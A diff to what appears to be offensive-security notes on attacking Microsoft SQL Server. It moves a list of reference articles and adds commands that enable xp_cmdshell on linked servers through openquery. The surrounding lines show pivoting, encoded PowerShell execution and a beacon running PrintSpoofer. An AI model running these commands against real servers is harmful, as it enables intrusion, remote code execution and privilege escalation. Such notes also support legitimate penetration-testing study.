@@ -1219,19 +1219,6 @@ $ proxychains socat TCP4-Listen:1433,fork TCP:10.0.0.20:1433
 cmd.exe> runas /netonly /user:VAULT\mssql_svc "C:\Program Files\HeidiSQL\heidisql.exe"
 ```
 
-### Resources
-- [Attacking SQL Server CLR Assemblies](https://www.netspi.com/blog/technical/adversary-simulation/attacking-sql-server-clr-assemblies/)
-- [Hacking SQL Server Stored Procedures – Part 1: (un)Trustworthy Databases](https://www.netspi.com/blog/technical/network-penetration-testing/hacking-sql-server-stored-procedures-part-1-untrustworthy-databases/)
-- [Hacking SQL Server Stored Procedures – Part 2: User Impersonation](https://www.netspi.com/blog/technical/network-penetration-testing/hacking-sql-server-stored-procedures-part-2-user-impersonation/)
-- [Hacking SQL Server Stored Procedures – Part 3: SQL Injection](https://www.netspi.com/blog/technical/network-penetration-testing/hacking-sql-server-stored-procedures-part-3-sqli-and-user-impersonation/)
-- [Lateral movement through Microsoft SQL Server links](https://hackmag.com/security/lateral-movement/)
-- [The dangers of MSSQL features – Impersonation & Links](https://improsec.com/tech-blog/dangers-mssql-features-impersonation-amp-links)
-- [Using SQL Server for attacking a Forest Trust](http://www.labofapenetrationtester.com/2017/03/using-sql-server-for-attacking-forest-trust.html)
-- [How to Hack Database Links in SQL Server!](https://www.netspi.com/blog/technical/network-penetration-testing/how-to-hack-database-links-in-sql-server/)
-- [Database Links Cheat Sheet](https://github.com/SofianeHamlaoui/Pentest-Notes/blob/master/Security_cheatsheets/databases/sqlserver/5-lateral-movement.md)
-- [MSSQL - OSEP Code Snippets](https://github.com/chvancooten/OSEP-Code-Snippets/blob/main/MSSQL/Program.cs)
-- [PowerUpSQL](https://github.com/NetSPI/PowerUpSQL)
-
 ### Client
 
 Using Heidi
@@ -1272,12 +1259,17 @@ SELECT * FROM master..sysservers
 # execute queries on link
 SELECT * FROM OPENQUERY("sql02.vault.external", 'select @@servername')
 
-# Enable xp_cmdshell (openquery will not work)
+# Enable xp_cmdshell 
 EXEC('sp_configure ''show advanced options'', 1; reconfigure;') AT [sql02.vault.io]
 
 EXEC('sp_configure ''xp_cmdshell'', 1; reconfigure;') AT [sql02.vault.io]
 
 SELECT * FROM OPENQUERY("sql02.vault.io", 'select * from sys.configurations where name = ''xp_cmdshell''')
+
+# Enable xp_cmdshell **via** openquery
+SELECT 1 FROM openquery("dc01", 'select 1; EXEC sp_configure ''show advanced options'', 1; reconfigure')
+
+SELECT 1 FROM openquery("dc01", 'select 1; EXEC sp_configure ''xp_cmdshell'', 1; reconfigure')
 
 # scripted web delivery
 SELECT * FROM OPENQUERY("sql02.vault.io", 'select @@servername; exec xp_cmdshell ''powershell -enc [...snip...]''')
@@ -1299,7 +1291,17 @@ beacon> shell PrintSpoofer.exe -c "powershell -enc [...]"
 ```
 
 ### Resources
-- https://github.com/NetSPI/PowerUpSQL
+- [Attacking SQL Server CLR Assemblies](https://www.netspi.com/blog/technical/adversary-simulation/attacking-sql-server-clr-assemblies/)
+- [Hacking SQL Server Stored Procedures – Part 1: (un)Trustworthy Databases](https://www.netspi.com/blog/technical/network-penetration-testing/hacking-sql-server-stored-procedures-part-1-untrustworthy-databases/)
+- [Hacking SQL Server Stored Procedures – Part 2: User Impersonation](https://www.netspi.com/blog/technical/network-penetration-testing/hacking-sql-server-stored-procedures-part-2-user-impersonation/)
+- [Hacking SQL Server Stored Procedures – Part 3: SQL Injection](https://www.netspi.com/blog/technical/network-penetration-testing/hacking-sql-server-stored-procedures-part-3-sqli-and-user-impersonation/)
+- [Lateral movement through Microsoft SQL Server links](https://hackmag.com/security/lateral-movement/)
+- [The dangers of MSSQL features – Impersonation & Links](https://improsec.com/tech-blog/dangers-mssql-features-impersonation-amp-links)
+- [Using SQL Server for attacking a Forest Trust](http://www.labofapenetrationtester.com/2017/03/using-sql-server-for-attacking-forest-trust.html)
+- [How to Hack Database Links in SQL Server!](https://www.netspi.com/blog/technical/network-penetration-testing/how-to-hack-database-links-in-sql-server/)
+- [Database Links Cheat Sheet](https://github.com/SofianeHamlaoui/Pentest-Notes/blob/master/Security_cheatsheets/databases/sqlserver/5-lateral-movement.md)
+- [MSSQL - OSEP Code Snippets](https://github.com/chvancooten/OSEP-Code-Snippets/blob/main/MSSQL/Program.cs)
+- [PowerUpSQL](https://github.com/NetSPI/PowerUpSQL)
 
 ## Full Control
 
